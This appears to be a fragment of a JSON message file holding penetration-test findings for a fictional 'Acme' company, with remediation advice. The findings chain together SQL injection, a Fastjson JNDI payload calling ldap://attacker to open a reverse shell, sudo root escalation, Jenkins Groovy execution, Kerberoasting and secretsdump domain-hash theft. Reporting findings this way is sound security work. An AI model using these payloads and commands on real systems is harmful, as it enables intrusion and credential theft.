  "m2453": "Jenkins (internal)",
  "m2454": "Error-based SQL injection in website search",
  "m2455": "## Vulnerability overview\n\nThe `q` parameter of `www.acme.com/search` has **error-based SQL injection** (MSSQL), exposing the database version, schema, and potentially sensitive data.\n\n## Impact\n\n- Read access to `acme_prod` schema and user/order data\n- Error responses simplify exploitation; high risk\n\n## Reproduction\n\n1. Trigger error-based injection:\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. The response reveals an MSSQL version error, confirming injection\n3. Enumerate databases: `sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## Remediation\n\n- Use parameterized queries/prepared statements instead of concatenation\n- Disable detailed production error responses\n- Apply least privilege to database accounts and disable dangerous extensions such as `xp_cmdshell`\n",
  "m2456": "Error-based SQL injection in www.acme.com/search q parameter",
  "m2457": "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → MSSQL version error returned; schema readable.",
  "m2458": "Acme website and admin external assessment",
  "m2459": "api.acme.com/v1/orders?id= exposes other users' orders through IDOR",
  "m2460": "Changing id=1001 to id=1002 returns another user's order with address and phone number; no ownership check.",
  "m2461": "Weak API JWT secret allows offline cracking and forgery",
  "m2462": "HS256 secret 'secret' cracked by john in 5 seconds → arbitrary sub can be forged to bypass authorization.",
  "m2463": "Unescaped q parameter causes reflected XSS on search page",
  "m2464": "q=<script>alert(document.domain)</script> is reflected unchanged in the result title.",
  "m2465": "www.acme.com exposes .git, allowing source recovery",
  "m2466": "GET /.git/HEAD → 200; git-dumper recovered backend source and comments containing database connection strings.",
  "m2467": "admin.acme.com uses default credentials admin/admin123",
  "m2468": "Login succeeded; admin console provides user and order management.",
  "m2469": "Arbitrary redirect through next parameter after login",
  "m2470": "/login?next=https://evil.example redirects to an external site with HTTP 302 after login.",
  "m2471": "Login endpoint lacks rate limiting, allowing brute force",
  "m2472": "1,000 attempts/minute without lockout or CAPTCHA.",
  "m2473": "API 500 errors expose stack traces, paths, and framework versions",
  "m2474": "A triggered 500 returns a Node.js stack trace with absolute paths and dependency versions.",
  "m2475": "Shop uses an outdated component with a known RCE",
  "m2476": "Fingerprint identified component v2.3.1, associated with CVE-2024-xxxx deserialization RCE.",
  "m2477": "Leaked source contains hardcoded database credentials sa/Acme@2021",
  "m2478": "git-dumper recovered config.php from www.acme.com/.git with a plaintext database password, later confirmed reusable internally.",
  "m2479": "Shop Fastjson deserialization remote command execution",
  "m2480": "## Vulnerability overview\n\n`shop.acme.com/api/import` parses user-controlled JSON with **Fastjson 1.2.24** and no `safeMode`. Arbitrary classes selected via `@type` permit **JNDI injection → remote command execution**.\n\n## Impact\n\n- Unauthenticated arbitrary command execution on the DMZ web server (`www-data@dmz-web01`)\n- Combined with privilege escalation, provides an internal network foothold\n\n## Reproduction\n\n1. Construct a JNDI payload:\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import`, `Content-Type: application/json`\n3. Target calls back to dnslog and opens a reverse shell\n\n## Remediation\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`\n- Add authentication and source validation to `/api/import`\n- Restrict egress: prohibit outbound LDAP/RMI from application servers\n",
  "m2481": "shop.acme.com Fastjson 1.2.24 deserialization remote command execution",
  "m2482": "POST /api/import with a JNDI payload (@type:JdbcRowSetImpl) → dnslog callback and reverse shell (www-data@dmz-web01).",
  "m2483": "DMZ sudo NOPASSWD misconfiguration allows local root escalation",
  "m2484": "sudo -l shows (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' obtains root directly.",
  "m2485": "Dual-homed DMZ host bypasses internal network isolation",
  "m2486": "dmz-web01's second interface is on 10.10.10.0/24, reaching the domain controller, file server, and Jenkins directly from the DMZ.",
  "m2487": "Unauthenticated internal Jenkins Script Console allows remote commands",
  "m2488": "GET /script runs Groovy without login: 'whoami'.execute().text → SYSTEM; domain account acme\\\\svc_deploy exported from the credential store.",
  "m2489": "Domain service account svc_sql is Kerberoastable and uses a weak password",
  "m2490": "GetUserSPNs requests svc_sql's TGS; hashcat -m 13100 cracks Sql@2020 offline. The account belongs to the SQL admin group.",
  "m2491": "Full control of internal domain controller DC01 (Domain Admin)",
  "m2492": "## Vulnerability overview\n\nExternal Fastjson RCE provided a DMZ foothold. Sudo escalation, a dual-homed host, and unauthenticated Jenkins RCE exposed `svc_deploy`, a **Domain Admins** member, enabling full control of **DC01**.\n\n## Impact\n\n- Domain administrator access controls domain hosts and accounts\n- `secretsdump` exports all domain NTLM hashes, including `krbtgt`, enabling golden tickets for persistence\n- Internal target objective reached\n\n## Reproduction\n\n1. Log in as `svc_deploy` and export hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Obtain SYSTEM on DC01 and export all domain hashes\n\n## Remediation\n\n- Reduce service-account privileges, remove Domain Admins membership, and enforce tiered administration\n- Reset `krbtgt` twice and rotate strong service-account passwords\n- Repair DMZ/internal isolation and the preceding RCE/escalation chain\n",
  "m2493": "DC01 domain controller controlled (Domain Admin) — internal objective met",
  "m2494": "svc_deploy belongs to Domain Admins. psexec.py obtained SYSTEM on DC01; secretsdump exported domain NTLM hashes including krbtgt, completing target control.",
